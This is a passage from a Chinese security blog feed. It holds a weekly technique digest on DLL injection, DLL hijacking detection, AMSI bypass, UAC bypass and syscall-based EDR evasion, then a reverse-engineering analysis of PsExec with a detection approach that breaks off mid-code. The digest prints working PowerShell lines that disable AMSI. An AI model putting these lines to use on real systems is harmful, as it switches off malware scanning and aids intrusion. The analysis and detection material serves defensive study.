    <content type="html"><![CDATA[<h2 id="0x00-绿盟科技-每周蓝军技术推送（2022-4-9-4-15）"><a href="#0x00-绿盟科技-每周蓝军技术推送（2022-4-9-4-15）" class="headerlink" title="0x00 绿盟科技-每周蓝军技术推送（2022.4.9-4.15）"></a>0x00 绿盟科技-每周蓝军技术推送（2022.4.9-4.15）</h2><ul><li>原文链接：<a href="https://mp.weixin.qq.com/s/LN8k0J4lOn-ZV5LmDfSTBQ" target="_blank" rel="external">每周蓝军技术推送（2022.4.9-4.15）</a></li></ul><a id="more"></a><h2 id="0x01-修改内存中的-PE-头来注入-DLL-的一种方法"><a href="#0x01-修改内存中的-PE-头来注入-DLL-的一种方法" class="headerlink" title="0x01 修改内存中的 PE 头来注入 DLL 的一种方法"></a>0x01 修改内存中的 PE 头来注入 DLL 的一种方法</h2><ul><li><p><a href="https://www.x86matthew.com/view_post?id=import_dll_injection" target="_blank" rel="external">这篇文章</a>主要原理是：windows在装载程序的时候会根据导入表的数据装载所需要的Dll文件，<br>这篇文章的原理是通过在程序导出表中添加IID数组，然后在Resume主线程的时候，windows装载器便会加载所需要的dll实现dll注入。</p></li><li><p>这个办法缺点：</p><ul><li>1.是只能注入刚刚启动的进程，</li><li>2.还有敏感函数ResumeThead操作。好处就是不需要CreateRemoteThread函数。</li></ul></li></ul><h2 id="0x02-针对Office的DLL劫持研究"><a href="#0x02-针对Office的DLL劫持研究" class="headerlink" title="0x02 针对Office的DLL劫持研究"></a>0x02 针对Office的DLL劫持研究</h2><ul><li><p><a href="https://medium.com/@tamirye94/office-multiple-search-order-dll-hijacking-67e76001ecf1" target="_blank" rel="external">这篇文章</a>就讲了一个搜索顺序类型的dll劫持，而且现在微软并不认为这算是一个漏洞，所以短时间内应该是不会进行修复的。关于这种类型的dll劫持的检测思路可以是这样的：</p></li><li><p>因为Windows安全dll搜索顺序是这样，针对系统程序来说，其使用的dll多位于系统目录，要想目标dll能被劫持，目标dll的释放路径只可能在应用程序目录。</p><pre><code>1、加载应用程序的目录；2、系统目录，使用GetSystemDirectory函数获取该目录的路径；3、16位系统目录，没有获取该目录路径的函数，但会对该目录进行搜索；4、Windows目录，使用GetWindowsDirectory函数获取该目录的路径；5、当前目录；6、PATH环境变量中列出的目录。</code></pre></li><li>所以，我只需要寻找进程所加载dll的路径和进程路径一致的dll程序，并且在其他目录存在相同文件名称的dll，例如%system32%目录和%windows%。即可认为存在此类dll劫持。</li></ul><h2 id="0x03-AMSI-Bypass-的多种方法整理"><a href="#0x03-AMSI-Bypass-的多种方法整理" class="headerlink" title="0x03 AMSI Bypass 的多种方法整理"></a>0x03 AMSI Bypass 的多种方法整理</h2><ul><li><p>结合<a href="https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/" target="_blank" rel="external">这篇文章</a>，目前主要的ByPass AMSI的方法有两种，第1种是Patch amsi.dll文件。第2种是使amsi失效的方法。</p></li><li><p>1.通过patch AmsiScanBuffer函数，主要分为c#语言和ps语言。</p></li></ul><p>ref:<a href="https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998#file-my-am-bypass-ps1" target="_blank" rel="external">https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998#file-my-am-bypass-ps1</a></p><p>ref:<a href="https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs" target="_blank" rel="external">https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs</a></p><ul><li>2.通过反射Patch AmsiScanBuffer函数地址，为了避免被探测，其首先获取了DllGetClassObject的地址，然后通过暴力搜索特征码的方式获取AmsiScanBuffer进行patch</li></ul><p>ref:<a href="https://gist.github.com/shantanu561993/6483e524dc225a188de04465c8512909" target="_blank" rel="external">https://gist.github.com/shantanu561993/6483e524dc225a188de04465c8512909</a></p><ul><li>3.使amsi失效，通过设置System.Management.Automation.AmsiUtils的属性amsiInitFailed或者amsiContext使AMSI失效。</li></ul><p>[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)</p><p>Ref:<a href="https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1" target="_blank" rel="external">https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1</a></p><ul><li>使amsi失效，该方法会导致异常，而且windows已经针对部分字符串进行检测。但是可以混淆绕过。</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$mem</span> = [System.Runtime.InteropServices.Marshal]<span class="symbol">:</span><span class="symbol">:AllocHGlobal</span>(<span class="number">9076</span>)</div><div class="line">[Ref].Assembly.GetType(<span class="string">"System.Management.Automation.AmsiUtils"</span>).GetField(<span class="string">"amsiSession"</span>,<span class="string">"NonPublic,Static"</span>).SetValue(<span class="variable">$null</span>, <span class="variable">$null</span>);</div><div class="line">[Ref].Assembly.GetType(<span class="string">"System.Management.Automation.AmsiUtils"</span>).GetField(<span class="string">"amsiContext"</span>,<span class="string">"NonPublic,Static"</span>).SetValue(<span class="variable">$null</span>, [IntPtr]<span class="variable">$mem</span>)</div></pre></td></tr></table></figure><h2 id="0x04-Windows特权句柄利用分析"><a href="#0x04-Windows特权句柄利用分析" class="headerlink" title="0x04 Windows特权句柄利用分析"></a>0x04 Windows特权句柄利用分析</h2><ul><li><p><a href="https://mp.weixin.qq.com/s/VJEgxfcuDRKMGBdkrXyRlA" target="_blank" rel="external">这篇文章</a>所描述的是，通过Hunt系统中的高完整性级别的句柄，来进行ByPass UAC。其原理和之前推得一篇文章很相似。<br>那篇原理是通过拉起某些自动提升UAC权限的进程，然后通过dump进程句柄实现的。这篇是寻找高完整性句柄，并以此启动进程进行ByPassUAC。</p></li><li><p>再讲一下为什么只需要获取高完整性级别的Handle就可以进行ByPass UAC。ByPassUAC原理就是父子进程的完整性级别是继承的，在创建进程之前的CreateProcess函数，会设置一个名为STARTUPINFOEXW结构体。其保存了一些启动信息。当我们创建进程之前，提前设置STARTUPINFOEXW的lpAttributeList元素，就可以是新创建的进程具有使用泄露句柄的进程完整性级别。关于UpdateProcThreadAttribute用法，可以看这篇文章<a href="https://blog.csdn.net/linlin003/article/details/108864860" target="_blank" rel="external">https://blog.csdn.net/linlin003/article/details/108864860</a></p></li></ul><h2 id="0x05-探索Windows-内核中的系统调用"><a href="#0x05-探索Windows-内核中的系统调用" class="headerlink" title="0x05 探索Windows 内核中的系统调用"></a>0x05 探索Windows 内核中的系统调用</h2><ul><li><p>这篇文章主要讲的是通过syscall绕过EDR产品的原理，因为EDR或者杀毒软件通常会在一些敏感函数下Hook，部分杀软Hook的地方比较偏向应用层，因为内核层搞事情容易蓝屏，而syscall位于ntdll中的Nt*函数，通过直接调用Nt函数，这样就可以绕过部分杀毒软件。</p></li><li><p>目前来说，我比较看好的项目<a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" rel="external">SysWhisoers2 </a>，国内有大佬也总结了syscall几个很好的项目。<a href="https://tttang.com/archive/1464/#toc_syswhisoers2" target="_blank" rel="external">syscall的前世今生</a></p></li><li><p>但是，Syscall Bypass这种技术，目前对于普通使用者来说难度较大，因为Nt*更接近于底层，没有暴露的API接口使用，部分结构体甚至没有公布，只能通过Re的方法进行了解。所以，需要自己写一套Stub去调用Nt函数。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-绿盟科技-每周蓝军技术推送（2022-4-9-4-15）&quot;&gt;&lt;a href=&quot;#0x00-绿盟科技-每周蓝军技术推送（2022-4-9-4-15）&quot; class=&quot;headerlink&quot; title=&quot;0x00 绿盟科技-每周蓝军技术推送（2022.4.9-4.15）&quot;&gt;&lt;/a&gt;0x00 绿盟科技-每周蓝军技术推送（2022.4.9-4.15）&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;原文链接：&lt;a href=&quot;https://mp.weixin.qq.com/s/LN8k0J4lOn-ZV5LmDfSTBQ&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;每周蓝军技术推送（2022.4.9-4.15）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>深度剖析PsExec</title>
    <link href="https://findream.github.io/2021/12/24/%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90PsExec/"/>
    <id>https://findream.github.io/2021/12/24/深入剖析PsExec/</id>
    <published>2021-12-24T12:45:11.000Z</published>
    <updated>2022-11-12T06:58:10.534Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文主要通过逆向分析的方法分析PsExec的技术实现和有关PsExec和类PsExec工具的检测方法，当然其中也会掺杂一些乱七八糟的点，都是学习PsExec的一些总结。本文行文仓促，如有错误，请各位积极指正。</p><a id="more"></a><h2 id="0x2-什么是PsExec"><a href="#0x2-什么是PsExec" class="headerlink" title="0x2 什么是PsExec"></a>0x2 什么是PsExec</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在微软文档中，PsExec 是一种轻量级的 telnet 替代品，可让您在其他系统上执行进程，并与控制台应用程序完全交互，而无需手动安装客户端软件。国内也有很多大佬写过PsExec原理分析的文章，RcoIl通过分析数据包的方式为我们介绍了PsExec实现的原理。具体可以参考<a href="http://rcoil.me/2019/08/【知识回顾】深入了解%20PsExec/" target="_blank" rel="external">http://rcoil.me/2019/08/【知识回顾】深入了解%20PsExec/</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RcoIl通过分析流量，大致将PsExec的执行过程分为3个部分,而PSEXESVC 服务充当一个重定向器（包装器）。它在远程系统上运行指定的可执行文件</p><ul><li>将 PSEXESVC.exe 上传到 ADMIN$ （指向 /admin$/system32/PSEXESVC.EXE）共享文件夹内</li><li>远程创建用于运行 PSEXESVC.exe 的服务</li><li>远程启动服务</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结一下，就是PsExec通过ADMIN$将一个PSEXESVC文件上传到目标机器，然后通过命名管道的机制，将攻击者输入的命令重定向执行被攻击者机器的文件。但是实际上我还是不知道PsExec是怎么通过ADMIN$进行上传文件的，也不知道怎么通过管道机制使被攻击者机器执行命令的。</p><h2 id="0x3-如何传递PsExecSvr"><a href="#0x3-如何传递PsExecSvr" class="headerlink" title="0x3 如何传递PsExecSvr"></a>0x3 如何传递PsExecSvr</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PsExec是Mark Russinovich编写的 Sysinternals Suite中的工具，可以在<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="external">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a>处下载。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除去对参数，和运行环境做一些校验外，直接定位到PsExec最为关键的代码sub_7040。<br>    <img src="http://hacky.wang/blog/20210627/HYIGiuLiGr31.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在sub_7040，首先会构造远程文件的地址，然后将服务名，服务文件路径，用户名，密码等相关信息作为参数传入sub_41D0。而sub_41D0这个函数正是投送PSEXESVC.exe的原因所在。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，sub_41D0会将参数重新赋值到局部变量，这是很常见的操作，这些变量分别是</p><ul><li>filepath_svcpe：即PSEXESVC.exe文件的路径</li><li>lpDisplayName：即服务的DisplayName，友好名称</li><li>psz_PSEXESVC：就是那串字符串，表示文件名(一般为PSEXESVC.exe)</li><li>RemoteComputerName：远程主机名</li><li>lpUserName：用户名</li><li>lpPassWord：密码</li><li>lpServiceName：服务名<br>  <img src="http://hacky.wang/blog/20210627/3d2u7mXrPerT.png?imageslim" alt="mark"></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着判断远程主机名是否就是本地主机名，如果是本地主机的话，就会通过gethostname，gethostbyname，inet_ntoa等函数转化为点分十进制地址，然后进行下一步的链接。当然，如果远程主机就是本地主机的话是不需要将PSEXESVC.exe直接上传到远程主机的，所以直接创建进程<br>    <img src="http://hacky.wang/blog/20210627/TideqtWTknz1.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果待定的远程主机名不是本地主机名的话，执行开线程链接。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Thread_ConnectRemoteHostBySMB2(相对地址为0x4A50)中，首先建立IPC$连接，并从资源中释放PSEXESVC.exe<br>    <img src="http://hacky.wang/blog/20210627/xL6c7yimyDQR.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20210627/3rPBOidtreM1.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当PSEXESVC.exe释放之后，创建DisplayName = “PSEXESVC”的服务<br>    <img src="http://hacky.wang/blog/20210627/Qq0kSCgl8c7h.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后向远程主机创建authentication key<br>    <img src="http://hacky.wang/blog/20210627/nRJY9bL4cWI4.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着通过CopyFileW直接复制到远程主机路径，亦可通过WriteFile写入远程主机<br>    <img src="http://hacky.wang/blog/20210627/s2SVzF5Ngp7K.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20210627/LWHQcxwSk9dg.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着创建三个命名管道用于和PSEXESVC进行通讯，分别是stdin，stdout，stderr<br>     <img src="http://hacky.wang/blog/20210627/JgHqfs9uRAju.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;随后分别拉起三个线程，用于三个命名管道的数据传输(并不是这三个管道之间进行传输)，第一个参数为phKey，如果有phkey则需要将数据解密在进行传输，否则的话直接进行传输即可，第二个参数管道句柄。<br>     <img src="http://hacky.wang/blog/20210627/HAQhx6YIHQnj.png?imageslim" alt="mark"><br>     <img src="http://hacky.wang/blog/20210627/yVFrVO5Gq9IB.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;剩下的就是一些退出操作，比如停止及删除服务，删除文件等操作<br>     <img src="http://hacky.wang/blog/20210627/Xjk0cWLfWuer.png?imageslim" alt="mark"><br>     <img src="http://hacky.wang/blog/20210627/FpNDmhsL2ITM.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;值得注意的是，PsExec使用了ADMIN$传输PSEXESVC.exe，但是仅仅使用WNetAddConnection2W添加了一个关于IPC$的链接，并在退出之时关闭了IPC$的链接。<br>     <img src="http://hacky.wang/blog/20210627/PL6PjMk5j6Gm.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结一下，其实PsExec就是通过Admin$共享将文件传输到远程主机，Admin$相当于虚拟了一个文件夹，也可以理解成Admin$是C:\Windows的符号链接。如果将Admin$理解成一个符号链接，并指向的是C:\Windows，那么我们可以在上面执行任何关于文件的操作，包括创建,写入,删除文件,这些都是可以通过Windows提供的API实现。Admin$本质其实是利用SMB协议实现的，当我去链接windowx xp的机器的时候，可以看到使用的是SMB1的协议，而当我链接windows7的时候使用的却是SMB2的协议。<br>    <img src="http://hacky.wang/blog/20210627/RcTR0DRWnj8L.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有师傅也注意到了，为什么使用Admin$上传文件，但是为什么不需要使用WNetAddConnection2W添加一个Admin$链接。这也是我在分析时候的一个困惑，于是，我做了以下实验。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，使用net use \192.168.80.128\ipc$ “password” /user:”domain/username”建立一个远程连接。<br>    <img src="http://hacky.wang/blog/20210627/ltyd7jhtInfF.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后上传一份文件上去,可以看见文件以及上传成功。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CopyFile(<span class="string">"图19.png"</span>,<span class="string">"<span class="subst">\\</span><span class="subst">\\</span>192.168.80.128<span class="subst">\\</span>admin$<span class="subst">\\</span>aaa.png"</span>,<span class="literal">FALSE</span>)</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>    <img src="http://hacky.wang/blog/20210627/KG1dSP0DTxxe.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着，我删除上述链接，并创建一个Admin$的远程链接，然后在上传一份bbb.png的文件，可以发现无论ipc$还是admin$都是可以上传成功的。我觉得ipc$亦或是admin$在此处的作用都是为了验证用户名和密码是否有效，验证完成之后，可以直接通过Admin$上传文件。这也是有的文章上面说可以先建立一个ipc$链接，然后在执行PsExec的原因所在了。<br>    <img src="http://hacky.wang/blog/20210627/Hv2iqmDQGOBp.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除此以外，为什么一定是要利用创建服务的方式去实现呢，实现驻留的方法也有很多，但为什么一定是服务呢，我在<a href="http://www.intelliadmin.com/index.php/2007/10/the-admin-share-explained/" target="_blank" rel="external">这篇文章</a>中找到了原因，当使用Admin$共享的时候，如果要执行复制到远程主机的文件的时候，这些文件之一必须是服务。</p><h2 id="0x4-如何执行命令"><a href="#0x4-如何执行命令" class="headerlink" title="0x4 如何执行命令"></a>0x4 如何执行命令</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;传递和返回结果的原理就很简单了，本质就如很多文章所说的，通过命名管道实现从本地主机到远程主机发送和接收数据。具体是这样的。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先分别创建stdin，stdout，stderr三个管道，并连接这三个命名管道用于接收和传递数据!<br>    <a href="http://hacky.wang/blog/20210711/v5IxhMxmTGkm.png?imageslim" target="_blank" rel="external">mark</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后传递一些参数进sub_67B0中，这些参数分别是：</p><ul><li>phKey,</li><li>&amp;Msg,</li><li>hPipe_Service,</li><li>hNamedPipe_stdin,</li><li>hNamedPipe_stdout,</li><li>hNamedPipe_stderr,</li><li>hEvent,</li><li>hHandle<br>  <img src="http://hacky.wang/blog/20210711/PeLFcFJGY1At.png?imageslim" alt="mark"></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先phKey是表示秘钥句柄，其可能是通过sub_404420中的CryptDeriveKey，或者是sub_4059C0中的CryptImportKey函数产生。<br>    <img src="http://hacky.wang/blog/20210711/tssdODMiAqm8.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;了解&amp;Msg参数，其实是需要了解第三个参数hPipe_Service。hPipe_Service其实是服务于服务本身的一个管道，PsExec一共会创建四个管道，其中一个用于服务自身，另外三个管道用于重定向。因为这个管道是以模块名为管道名称的，所以这个管道是服务于自身的一个管道。<br>    <img src="http://hacky.wang/blog/20210711/Wt0Ci2NDWGh8.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着看Msg就很好理解了，在sub_404720中，第二个参数是服务本身的管道，显然，这是从管道中读取相关信息。<br>    <img src="http://hacky.wang/blog/20210711/nWM5Ko8lg9zK.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来就是三个用于转发的管道，和事件句柄和线程句柄，和本文并没有多少关系。<br>    <img src="http://hacky.wang/blog/20210711/1WkoWRaBoCj4.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在sub_405AF0函数中，创建三个普通的管道，这三个管道并不是命名管道，作用是用于向进程发送数据，以及接受返回结果的作用。可以看到StartupInfo的dwFlags是USESHOWINDOW &amp; USESTDHANDLES。USESTDHANDLES表示着需要使用进程的三个管道。<br>    <img src="http://hacky.wang/blog/20210711/W8P72SdgqeXX.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着拉起三个线程，用于从普通管道读取数据，然后将数据写回到命名管道中，完成数据的传递。<br>    <img src="http://hacky.wang/blog/20210711/iHDFJxc6k3Nj.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后创建进程，后续三个线程监听管道的数据即可。<br>    <img src="http://hacky.wang/blog/20210711/nFar24tJw0Af.png?imageslim" alt="mark"></p><h2 id="0x5-如何检测PsExec"><a href="#0x5-如何检测PsExec" class="headerlink" title="0x5 如何检测PsExec"></a>0x5 如何检测PsExec</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前面，我们了解到PsExec通过SMB协议将PSEXESVC.exe传递到远程主机，并将其创建为一个服务，然后通过创建四个命名管道进行数据通信，然后通过CreateProcessAsUser创建带有管道的进程来监听或者发送命令。所以综上，我们可以通过三个维度来检测是否是PsExec程序。</p><ul><li>创建的子进程是否存在管道</li><li>父进程也就是PSEXESVC.exe，是否是服务</li><li>父进程是否存在命名管道</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过测试，对于类似于PsExec一样是可以检测的。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据之前的分析，PsExec最终会调用CreateProcessAsUserW拉起进程，并在StartupInfo设置重定向管道。所以，我们可以在通过Hook CreateProcessAsUserW函数或者类似函数CreateProcess，判断StartUpinfo是否存在重定向管道。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过分析CreateProcessAsUserW函数和CreateProcess函数发现，其最终会调用CreateProcessInternalW函数。并发现，其最终会调用Nt层的函数NtCreateUserProcess实现进程创建。<br>    <img src="http://hacky.wang/blog/20210718/wkJPdLW2156h.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20210718/rEDn0uWoryBR.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为不仅要考虑PsExec，还要考虑其他类似于PsExec的工具，我打算在Nt层进行Hook。所以，我决定将NtCreateUserProcess作为我的目标</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来就是确定参数StartUpInfo这个参数是如何传递给NtCreateUserProcess的，通过分析lpStartupInfo会最终传递到BasepCreateProcessParameters函数处理，然后返回。然后再将返回的ProcessParameters作为参数传递给NtCreateUserProcess。<br>    <img src="http://hacky.wang/blog/20210718/xnXeOIfdKbq5.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20210718/eWeCzUzi9o42.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在BasepCreateProcessParameters中，发现其就是在StartupInfo做了校验和复制。<br>    <img src="http://hacky.wang/blog/20210718/0M5lYKnDpwwd.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于了解windows内核的师傅，肯定了解其中的运行机制，也了解ProcessParameters结构的内容<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">typedef struct _RTL_USER_PROCESS_PARAMETERS</div><div class="line">&#123;</div><div class="line">ULONG MaximumLength<span class="comment">;</span></div><div class="line">ULONG Length<span class="comment">;</span></div><div class="line">ULONG Flags<span class="comment">;</span></div><div class="line">ULONG DebugFlags<span class="comment">;</span></div><div class="line">PVOID ConsoleHandle<span class="comment">;</span></div><div class="line">ULONG ConsoleFlags<span class="comment">;</span></div><div class="line">PVOID StandardInput<span class="comment">;</span></div><div class="line">PVOID StandardOutput<span class="comment">;</span></div><div class="line">PVOID StandardError<span class="comment">;</span></div><div class="line">CURDIR CurrentDirectory<span class="comment">;</span></div><div class="line">UNICODE_STRING DllPath<span class="comment">;</span></div><div class="line">UNICODE_STRING ImagePathName<span class="comment">;</span></div><div class="line">UNICODE_STRING CommandLine<span class="comment">;</span></div><div class="line">PVOID Environment<span class="comment">;</span></div><div class="line">ULONG StartingX<span class="comment">;</span></div><div class="line">ULONG StartingY<span class="comment">;</span></div><div class="line">ULONG CountX<span class="comment">;</span></div><div class="line">ULONG CountY<span class="comment">;</span></div><div class="line">ULONG CountCharsX<span class="comment">;</span></div><div class="line">ULONG CountCharsY<span class="comment">;</span></div><div class="line">ULONG FillAttribute<span class="comment">;</span></div><div class="line">ULONG WindowFlags<span class="comment">;</span></div><div class="line">ULONG <span class="keyword">ShowWindowFlags;</span></div><div class="line"><span class="keyword"></span>UNICODE_STRING WindowTitle<span class="comment">;</span></div><div class="line">UNICODE_STRING DesktopInfo<span class="comment">;</span></div><div class="line">UNICODE_STRING <span class="keyword">ShellInfo;</span></div><div class="line"><span class="keyword"></span>UNICODE_STRING RuntimeData<span class="comment">;</span></div><div class="line">RTL_DRIVE_LETTER_CURDIR CurrentDirectores[<span class="number">32</span>]<span class="comment">;</span></div><div class="line">ULONG EnvironmentSize<span class="comment">;</span></div><div class="line">&#125; RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为，我需要对系统全局的进程创建进行Hook，所以我决定采用SSDT Hook来达成这一目的,最重要的原因是我之前写过类似的Demo，可以直接使用。当然，使用回调一样是可以解决问题的，关于SSDTHook原理和编程，网络上也有很多讲解。当Hook NtCreateUserProcess之后，继而检查ProcessParameters-&gt;StandardInput，ProcessParameters-&gt;StandardOutput，ProcessParameters-&gt;StandardError是否为空即可。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;相对于PsExecSvc.exe，NtCreateUserProcess创建的进程是其子进程，所以PsExecSvc.exe算是NtCreateUserProcess创建的进程的父进程。NtCreateUserProcess函数原型如下,很显然，第一个参数是创建进程的ProcessHandle。所以，我们需要函数返回的ProcessHandle获取其父进程的进程数据(Pid或者Handle)<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">NTSTATUS NTAPI NtCreateUserProcess(</div><div class="line"><span class="keyword">OUT</span> PHANDLE ProcessHandle,</div><div class="line"><span class="keyword">OUT</span> PHANDLE ThreadHandle,</div><div class="line"><span class="keyword">IN</span> ACCESS_MASK ProcessDesiredAccess,</div><div class="line"><span class="keyword">IN</span> ACCESS_MASK ThreadDesiredAccess,</div><div class="line"><span class="keyword">IN</span> POBJECT_ATTRIBUTES ProcessObjectAttributes <span class="keyword">OPTIONAL</span>,</div><div class="line"><span class="keyword">IN</span> POBJECT_ATTRIBUTES ThreadObjectAttributes <span class="keyword">OPTIONAL</span>,</div><div class="line"><span class="keyword">IN</span> ULONG CreateProcessFlags,</div><div class="line"><span class="keyword">IN</span> ULONG CreateThreadFlags,</div><div class="line"><span class="keyword">IN</span> PRTL_USER_PROCESS_PARAMETERS ProcessParameters,</div><div class="line"><span class="keyword">IN</span> PVOID Parameter9,</div><div class="line"><span class="keyword">IN</span> PNT_PROC_THREAD_ATTRIBUTE_LIST AttributeList</div><div class="line">)</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以通过 ZwQueryInformationProcess 获取父进程Pid，具体可以这样做。<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">PROCESS_BASIC_INFORMATION pbi<span class="comment">;</span></div><div class="line"></div><div class="line">UNICODE_STRING routineName<span class="comment">;</span></div><div class="line">RtlInitUnicodeString(&amp;routineName, L<span class="string">"ZwQueryInformationProcess"</span>)<span class="comment">;</span></div><div class="line">ZwQueryInformationProcess = 